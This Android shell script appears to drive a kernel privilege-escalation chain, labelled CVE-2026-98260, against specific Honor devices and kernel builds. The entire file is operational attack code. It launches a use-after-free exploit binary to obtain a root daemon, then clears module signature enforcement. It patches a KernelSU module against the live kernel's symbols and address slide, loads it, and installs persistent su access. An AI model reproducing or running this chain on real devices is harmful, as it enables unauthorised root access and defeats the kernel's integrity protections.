#!/system/bin/sh
# CVE-2026-98260 / Honor 6.1.157 chain (ELP-AN00 / MagicPad3).
# 6.1.157 uses the MyUse brm_plant layout and its built-in slide calibration.
# This path intentionally does not reuse the 6.12/6.18 payload or --slide.
set -u
D=/data/local/tmp/magic/61157
ROOT=/data/local/tmp/magic
KSU6157=$ROOT/ksu6157
G264_DIR=$ROOT/g264
SU_G264_DIR=$ROOT/su-g264
SU=$D/pc98260_su
LOG=$D/run.log
KERNEL61157=$(uname -r 2>/dev/null)
case "$KERNEL61157" in
    6.1.157-android14-11-g7d3922fade43)
        SRC=$D/brm_plant; TARGET61157=elp ;;
    6.1.157-android14-11-g19a495a97bff)
        SRC=$D/brm_plant_magicpad; TARGET61157=magicpad ;;
    6.1.157-android14-11-g2646292297b1*)
        SRC=$D/brm_plant_g264; TARGET61157=amg
        KSU6157=$ROOT/ksu6157-g264 ;;
    *)
        echo "61157_KERNEL_MATCH=0 expected=ELP_g7d3922fade43_or_MagicPad_g19a495a97bff_or_AMG_g2646292297b1"
        exit 2 ;;
esac
BIN=$D/exploit-android-key-ptr
# brm_plant writes its exec proof under this legacy MyUse directory only.
mkdir -p /data/local/tmp/magic61 2>/dev/null || true
MINUP=${MAGICROOT_61157_MIN_UP:-120}

plant_alive() {
    ps -A 2>/dev/null | grep -q '[e]xploit-android-key-ptr' && return 0
    pgrep -f 'exploit-android-key-ptr' >/dev/null 2>&1
}

ksu_su_ready() {
    for _p in /system/bin/su /data/adb/ksu/bin/su; do
        if [ -x "$_p" ] &&
            timeout 5 "$_p" -c 'id' 2>/dev/null | grep -q 'uid=0(root)'; then
            return 0
        fi
    done
    return 1
}

echo "61157_CHAIN_BEGIN kernel=$KERNEL61157 target=$TARGET61157"
echo "61157_KERNEL_MATCH=1 model=$(getprop ro.product.model 2>/dev/null)"
[ -x "$SRC" ] || { echo "61157_FAIL=missing_brm_plant path=$SRC"; exit 2; }
[ -x "$SU" ] || { echo "61157_FAIL=missing_su path=$SU"; exit 2; }
if grep -q '^kernelsu ' /proc/modules 2>/dev/null ||
    [ -d /sys/module/kernelsu ]; then
    if ksu_su_ready; then
        echo "61157_KSU_ALREADY_ACTIVE=1 su=ok"
        exit 0
    fi
    echo "61157_KSU_ACTIVE_NO_SU=1"
    echo "61157_HINT=reboot_then_rerun_or_repair_manager"
    exit 77
fi

# The MyUse launcher waits for the post-boot churn to settle; running the UAF
# too early is the documented cause of an uncontrolled node and a reboot.
up=$(cut -d. -f1 /proc/uptime 2>/dev/null)
case "$up" in ''|*[!0-9]*) up=0 ;; esac
if [ "$up" -lt "$MINUP" ]; then
    echo "61157_SETTLE wait=$((MINUP-up))s uptime=${up}s"
    left=$((MINUP-up))
    while [ "$left" -gt 0 ]; do
        sleep 10
        left=$((left-10))
    done
fi

# Reuse a live rootd from the same boot.
if timeout 5 "$SU" -c id 2>/dev/null | grep -q 'uid=0(root) gid=0(root)'; then
    echo "61157_ROOTD_REUSE=1"
    echo "61157_ROOTD_READY=1"
    exit 0
fi

# Run under the known name so run.sh's cleanup_stale_98260_rootd sees a live
# plant and never unlinks a socket that still belongs to a zombie parent.
if ! plant_alive; then
    cp "$SRC" "$BIN" || { echo "61157_FAIL=copy"; exit 2; }
    chmod 755 "$BIN" "$SU" || true
    rm -f /data/local/tmp/pc98260-root.sock /data/local/tmp/pc98260-root2.sock 2>/dev/null || true
    : > "$LOG" 2>/dev/null || true
    echo "61157_PLANT_START"
    cd "$D" || exit 2
    # g264 on 6.1.157 does not reliably deliver the kmem free tracepoint;
    # enable the binary's blind-reclaim path (page_freed=0 in the 1.0.28 logs).
    _g264_env=""
    [ "$TARGET61157" = "amg" ] && _g264_env="PC98260_G264_BLIND_RECLAIM=1"
    if [ "${MAGICROOT_61157_KSU:-1}" = "1" ]; then
        env $_g264_env ./exploit-android-key-ptr --ksu >> "$LOG" 2>&1 &
    else
        env $_g264_env ./exploit-android-key-ptr >> "$LOG" 2>&1 &
    fi
else
    echo "61157_PLANT_REUSE=1"
fi

sig_restore_61157() {
    [ -x "$KSU6157/sigparam" ] || return 0
    "$SU" -c "'$KSU6157/sigparam' 1" >> "$LOG" 2>&1 || true
}

# Verified MyUse path for ELP-AN00 6.1.157:
#   brm_plant --ksu clears sig_enforce
#   ksu_prepare relocates the custom 225-symbol module against this boot's kallsyms
#   ksu-loader-generic init_module + restore sig_enforce + exec selected ksud
ksu_handoff_myuse() {
    KO=$D/kernelsu-honor.ko
    PREPARE=$KSU6157/ksu_prepare
    SYMS=$KSU6157/ksu-syms.txt
    LOADER=$KSU6157/ksu-loader-generic
    RUNTIME=$D/kernelsu-runtime.ko
    KSUD=${MAGICROOT_KSUD:-$D/ksud}
    [ -x "$KSUD" ] || KSUD=$D/ksud
    PKG=${MAGICROOT_KSU_PKG:-me.weishu.kernelsu}
    for f in "$KO" "$PREPARE" "$SYMS" "$LOADER" "$KSUD"; do
        [ -f "$f" ] || { echo "61157_KSU_SKIP=missing_asset path=$f"; sig_restore_61157; return 1; }
    done
    chmod 755 "$PREPARE" "$LOADER" "$KSUD" 2>/dev/null || true

    _model=$(getprop ro.product.model 2>/dev/null | tr -d '\r\n')
    echo "61157_KSU_MODEL=$_model"
    if [ "$_model" != "ELP-AN00" ]; then
        echo "61157_KSU_SKIP=unsupported_model model=$_model expected=ELP-AN00"
        sig_restore_61157
        return 1
    fi

    # The MyUse handoff is gated on the exact kernel config and BTF.  Reading
    # these needs the live rootd, because they are root-only on this kernel.
    _btf=$("$SU" -c "sha256sum /sys/kernel/btf/vmlinux 2>/dev/null | cut -d' ' -f1" 2>/dev/null | tr -d '\r\n')
    _cfg=$("$SU" -c "sha256sum /proc/config.gz 2>/dev/null | cut -d' ' -f1" 2>/dev/null | tr -d '\r\n')
    echo "61157_KSU_BTF=$_btf"
    echo "61157_KSU_CONFIG=$_cfg"
    if [ "$_btf" != "5d142fab5705a037a220a239fc029523a7f55380f488ac39c8d5fe3de9a9730b" ] ||
       [ "$_cfg" != "575ee4689f86b268f6eb3de6a58b15a727e032a4473a930577db5409be242f2c" ]; then
        echo "61157_KSU_SKIP=config_or_btf_mismatch"
        sig_restore_61157
        return 1
    fi

    rm -f "$RUNTIME"
    : > "$D/ksu-prepare.log"
    "$SU" -c "'$PREPARE' '$KO' '$SYMS' '$RUNTIME'" > "$D/ksu-prepare.log" 2>&1
    _prc=$?
    echo "61157_KSU_PREPARE_RC=$_prc"
    tail -10 "$D/ksu-prepare.log" 2>/dev/null || true
    if [ "$_prc" != "0" ] || [ ! -s "$RUNTIME" ]; then
        echo "61157_KSU_PREPARE=failed"
        sig_restore_61157
        return 1
    fi
    echo "61157_KSU_RUNTIME=$(wc -c < "$RUNTIME" 2>/dev/null | tr -d ' ')"
    echo "61157_KSU_PACKAGE=$PKG ksud=$KSUD"

    : > "$D/ksu.log"
    "$SU" -c "'$LOADER' '$RUNTIME' '$KSUD' '$PKG' 'android14-6.1' --restore-sig > '$D/ksu.log' 2>&1 < /dev/null &" 2>/dev/null || true
    _j=0
    while [ "$_j" -lt 45 ]; do
        for _ksu_su in /system/bin/su /data/adb/ksu/bin/su; do
            if [ -x "$_ksu_su" ] &&
                timeout 5 "$_ksu_su" -c 'id; getenforce' 2>/dev/null |
                grep -q 'uid=0(root)'; then
                echo "61157_KSU_HANDOFF=ok su=$_ksu_su package=$PKG"
                "$_ksu_su" -c 'id; getenforce' 2>/dev/null || true
                return 0
            fi
        done
        _j=$((_j+1))
        sleep 2
    done
    echo "61157_KSU_HANDOFF=failed package=$PKG"
    tail -25 "$D/ksu.log" 2>/dev/null || true
    # The custom kernel module is built from official KernelSU v3.3.1.  If a
    # selected fork's ksud cannot initialize it, fall back to the bundled
    # official ksud so the driver is still usable.  The module is already
    # loaded, so ksud's late-load only performs userspace initialization.
    if [ "$PKG" != "me.weishu.kernelsu" ]; then
        echo "61157_KSU_MANAGER_FALLBACK=official package=me.weishu.kernelsu"
        : > "$D/ksu-official.log"
        "$SU" -c "'$D/ksud' late-load --allow-shell --kmi android14-6.1 --package-name me.weishu.kernelsu > '$D/ksu-official.log' 2>&1 < /dev/null &" 2>/dev/null || true
        _j=0
        while [ "$_j" -lt 30 ]; do
            for _ksu_su in /system/bin/su /data/adb/ksu/bin/su; do
                if [ -x "$_ksu_su" ] &&
                    timeout 5 "$_ksu_su" -c 'id; getenforce' 2>/dev/null |
                    grep -q 'uid=0(root)'; then
                    echo "61157_KSU_HANDOFF=official-fallback su=$_ksu_su"
                    "$_ksu_su" -c 'id; getenforce' 2>/dev/null || true
                    return 0
                fi
            done
            _j=$((_j+1))
            sleep 2
        done
        tail -20 "$D/ksu-official.log" 2>/dev/null || true
    fi
    sig_restore_61157
    return 1
}


# g264 (AMG-AN00 / HONOR GT) uses the CGA re-linked KernelSU module.
# The module is linked at slide=0 and patched for this boot; after init_module
# the module switches SELinux back to Enforcing and the rootd socket is cut,
# so all subsequent setup uses ksud's kernel-driver channel instead of rootd.
ksu_handoff_g264() {
    BASE=$G264_DIR/ksm-g264-base.ko
    PATCHER=$G264_DIR/ko_slide_patch
    OUT=$D/ksm-g264.ko
    KSUD=$D/ksud
    for f in "$BASE" "$PATCHER" "$KSUD"; do
        [ -f "$f" ] || { echo "61157_G264_SKIP=missing_asset path=$f"; return 1; }
    done
    chmod 755 "$PATCHER" "$KSUD" 2>/dev/null || true

    _slide=$(grep -a -oE '\[(slide|cfg)\][^0-9]*0x[0-9a-f]+' "$LOG" 2>/dev/null |
        tail -1 | grep -oE '0x[0-9a-f]+')
    if [ -z "$_slide" ]; then
        _live=$("$SU" -c "grep ' _stext$' /proc/kallsyms 2>/dev/null | head -1 | cut -d' ' -f1" 2>/dev/null)
        case "$_live" in 0x*) _slide=$(printf '0x%x' $((_live - 0xffffffc080010000))) ;; esac
    fi
    case "$_slide" in 0x*|[0-9]*) ;; *) echo "61157_G264_SKIP=no_slide"; return 1 ;; esac
    case "$_slide" in 0x*) ;; *) _slide=$(printf '0x%x' "$_slide") ;; esac
    echo "61157_G264_SLIDE=$_slide"

    _patch=$("$PATCHER" "$BASE" "$OUT" "$_slide" 2>&1)
    echo "$_patch" | tee -a "$LOG"
    case "$_patch" in *abs_symbols=*) ;; *) echo "61157_G264_SKIP=patch_failed"; return 1 ;; esac
    [ -s "$OUT" ] || { echo "61157_G264_SKIP=empty_output"; return 1; }

    _pk_patch=$(printf '%s\n' "$_patch" | sed -n 's/.*_printk=\(0x[0-9a-fA-F]*\).*/\1/p' | tail -1)
    _pk_dev=$("$SU" -c 'grep -w _printk /proc/kallsyms' 2>/dev/null | awk '{print "0x"$1; exit}')
    echo "61157_G264_PRINTK=patch=${_pk_patch:-?} dev=${_pk_dev:-?}"
    if [ -n "$_pk_patch" ] && [ -n "$_pk_dev" ] && [ "$_pk_patch" != "$_pk_dev" ]; then
        echo "61157_G264_SKIP=printk_mismatch"
        return 1
    fi

    "$SU" -c "insmod '$OUT' allow_shell=1" >> "$LOG" 2>&1
    _ins=$?
    echo "61157_G264_INSMOD_RC=$_ins out=$OUT size=$(wc -c < "$OUT" 2>/dev/null | tr -d ' ')"
    sleep 2
    KSU_OK=0
    [ -d /sys/module/kernelsu ] && KSU_OK=1
    if [ "$KSU_OK" = "0" ]; then
        _probe=$(printf 'id\n' | timeout 10 "$KSUD" debug su 2>/dev/null | tr -d '\r')
        case "$_probe" in *uid=0*) KSU_OK=1 ;; esac
    fi
    [ "$KSU_OK" = "1" ] || {
        echo "61157_KSU_HANDOFF=g264-failed insmod_rc=$_ins"
        tail -30 "$LOG" 2>/dev/null || true
        return 1
    }

    echo "61157_KSU_HANDOFF=g264-cga insmod_rc=$_ins su_driver=ok"
    if [ -f "$SU_G264_DIR/setup_su_app.sh" ]; then
        echo "61157_SU_SETUP_BEGIN"
        printf 'sh %s %s %s\n' "$SU_G264_DIR/setup_su_app.sh" "$D" "$KSUD" |
            timeout 60 "$KSUD" debug su 2>&1 | tee -a "$LOG"
        echo "61157_SU_SETUP_RC=$?"
    else
        echo "61157_SU_SETUP_SKIP=missing_setup"
    fi
    return 0
}

ksu_handoff_61157() {
    if [ "$TARGET61157" = "magicpad" ]; then
        KO=$D/kernelsu-magicpad.ko
        SYMS=$D/syms_magicpad3.txt
        LOADER=$D/ksu-loader-magicpad
    elif [ "$TARGET61157" = "amg" ]; then
        KO=$D/kernelsu-honor.ko
        SYMS=$D/syms_g264.txt
        LOADER=$D/ksu-loader-g264
    else
        KO=$D/kernelsu-honor.ko
        SYMS=$D/syms_elp_an00.txt
        LOADER=$D/ksu-loader
    fi
    PATCHED=$D/kernelsu-runtime.ko
    KSUD=$D/ksud
    KP=/data/local/tmp/magic/ko_patch
    [ -x "$KP" ] && [ -f "$KO" ] && [ -x "$LOADER" ] && [ -x "$KSUD" ] &&
        [ -f "$SYMS" ] || {
        echo "61157_KSU_SKIP=missing_assets"
        return 1
    }
    _slide=$(grep -a -oE '\[(slide|cfg)\][^0-9]*0x[0-9a-f]+' "$LOG" 2>/dev/null |
        tail -1 | grep -oE '0x[0-9a-f]+')
    if [ -z "$_slide" ]; then
        _live=$("$SU" -c "grep ' _stext$' /proc/kallsyms 2>/dev/null | head -1 | cut -d' ' -f1" 2>/dev/null)
        case "$_live" in 0x*) _slide=$((_live - 0xffffffc080010000)) ;; esac
    fi
    case "$_slide" in 0x*|[0-9]*) ;; *) echo "61157_KSU_SKIP=no_slide"; return 1 ;; esac
    # Normalize arithmetic results to a hex string for ko_patch.
    case "$_slide" in 0x*) _slide_hex=$_slide ;; *) _slide_hex=$(printf '0x%x' "$_slide") ;; esac
    echo "61157_KSU_SLIDE=$_slide_hex"
    rm -f "$PATCHED"
    "$KP" "$KO" "$PATCHED" "$SYMS" "$_slide_hex" "$(uname -r)" > "$D/ko_patch.log" 2>&1
    _prc=$?
    grep -E 'PATCHED=|MISSING=|ERR=' "$D/ko_patch.log" 2>/dev/null | tail -4 || true
    [ "$_prc" = "0" ] && [ -f "$PATCHED" ] || {
        echo "61157_KSU_PATCH_RC=$_prc"
        return 1
    }
    chmod 755 "$LOADER" "$KSUD" 2>/dev/null || true
    "$SU" -c "cd '$D' && nohup ./ksu-loader '$PATCHED' '$KSUD' > '$D/ksu.log' 2>&1 < /dev/null &" 2>/dev/null || true
    _j=0
    while [ "$_j" -lt 45 ]; do
        for _ksu_su in /system/bin/su /data/adb/ksu/bin/su; do
            if [ -x "$_ksu_su" ] &&
                timeout 5 "$_ksu_su" -c 'id; getenforce' 2>/dev/null |
                grep -q 'uid=0(root)'; then
                echo "61157_KSU_HANDOFF=ok su=$_ksu_su"
                "$_ksu_su" -c 'id; getenforce' 2>/dev/null || true
                return 0
            fi
        done
        _j=$((_j+1))
        sleep 2
    done
    echo "61157_KSU_HANDOFF=failed"
    tail -20 "$D/ksu.log" 2>/dev/null || true
    return 1
}

i=0
while [ "$i" -lt 150 ]; do
    if timeout 5 "$SU" -c id 2>/dev/null | grep -q 'uid=0(root) gid=0(root)'; then
        echo "61157_ROOTD_READY=1"
        "$SU" -c 'id; getenforce; grep CapEff /proc/self/status' 2>/dev/null || true
        if [ "${MAGICROOT_61157_KSU:-1}" = "1" ]; then
            if [ "$TARGET61157" = "elp" ]; then
                ksu_handoff_myuse || echo "61157_KSU_FALLBACK=rootd_only"
            elif [ "$TARGET61157" = "amg" ]; then
                ksu_handoff_g264 || echo "61157_KSU_FALLBACK=rootd_only"
            else
                ksu_handoff_61157 || echo "61157_KSU_FALLBACK=rootd_only"
            fi
        else
            echo "61157_KSU_HANDOFF=disabled target=$TARGET61157"
        fi
        exit 0
    fi
    plant_alive || {
        echo "61157_PLANT_GONE=1"
        tail -25 "$LOG" 2>/dev/null || true
        exit 76
    }
    i=$((i+1))
    sleep 2
done

echo "61157_ROOTD_TIMEOUT=1"
tail -30 "$LOG" 2>/dev/null || true
# Fail closed: leave the plant parked; no SIGKILL and no socket unlink here.
exit 76
